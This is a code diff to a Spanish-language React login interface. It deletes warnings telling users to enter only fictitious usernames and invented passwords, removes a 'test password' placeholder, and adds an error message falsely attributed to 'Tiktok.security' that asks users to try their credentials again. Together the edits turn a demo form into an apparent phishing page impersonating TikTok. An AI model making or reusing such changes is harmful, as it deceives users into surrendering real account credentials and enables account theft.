@@ -181,8 +181,7 @@ function App() {
           </h2>
 
           <p className="description left">
-            Ingresa un nombre de usuario o correo ficticio para probar
-            la vinculación. No uses datos reales.
+            Ingresa un nombre de usuario o correo.
           </p>
 
           <div className="usernameContainer">
@@ -255,8 +254,7 @@ function App() {
           </h2>
 
           <p className="description left">
-            Ingresa una contraseña inventada para probar la interfaz.
-            No uses tu contraseña real.
+            Ingresa contraseña
           </p>
 
           <input
@@ -270,7 +268,7 @@ function App() {
                 e.target.value
               )
             }
-            placeholder="contraseña de prueba"
+            placeholder="contraseña"
           />
 
           {message && (
@@ -331,8 +329,7 @@ function App() {
           </h2>
 
           <p className="description">
-            La app aún no está completa.
-            Vuelve a intentarlo más tarde.
+            nombre o contraseña no confirmadas por Tiktok.security. intenta de nuevo
           </p>
 
           <button
